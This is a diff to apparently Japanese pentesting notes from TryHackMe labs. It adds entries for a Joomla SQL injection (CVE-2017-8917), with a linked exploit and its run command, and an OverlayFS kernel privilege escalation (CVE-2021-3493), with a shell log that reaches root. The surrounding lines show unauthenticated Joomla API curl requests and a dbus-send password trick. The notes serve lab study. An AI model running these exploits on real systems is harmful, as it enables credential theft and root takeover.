@@ -217,6 +217,8 @@ https://tryhackme.com/room/joomify
 - API エンドポイントで GET パラメータの public を true にすることで認証なしでアクセスできるようになる。
 - 情報漏洩の脆弱性で、重大度は Medium。
 
+`/language/en-GB/en-GB.xml` でバージョンを確認できる。
+
 api 配下のフォルダ構造を脆弱性のあるバージョンをダウンロードして調べることが可能。  
 https://downloads.joomla.org/cms/joomla4/4-1-0
 
@@ -231,6 +233,17 @@ curl -v http://10.10.120.177/api/index.php/v1/config/application?public=true
 
 # ユーザー
 curl -v http://10.10.120.177/api/index.php/v1/users?public=true
+```
+
+## CVE-2017-8917 (Joomla)
+
+- Joomla! `3.7.0`
+- SQLi でユーザー名とパスワードハッシュを入手する。
+
+https://github.com/XiphosResearch/exploits/tree/master/Joomblah
+
+```sh
+python2 ./ex.py http://daily.thm/
 ```
 
 ## CVE-2023-21746 (LocalPotato)
@@ -771,3 +784,24 @@ openssl passwd -6 Expl01ted
 # 設定
 dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
 ```
+
+## CVE-2021-3493 (OverlayFS)
+
+https://tryhackme.com/room/overlayfs
+
+```
+affected from 5.8 kernel before 5.8.0-50.56 
+affected from 5.4 kernel before 5.4.0-72.80 
+affected from 4.15 kernel before 4.15.0-142.146 
+affected from 4.4 kernel before 4.4.0-209.241 
+```
+
+[エクスプロイトコード](https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/)
+
+```sh
+overlay@overlayfs:~$ gcc -o exploit ./exploit.c
+overlay@overlayfs:~$ ./exploit
+bash-4.4# id
+uid=0(root) gid=0(root) groups=0(root),1001(overlay)
+```
+
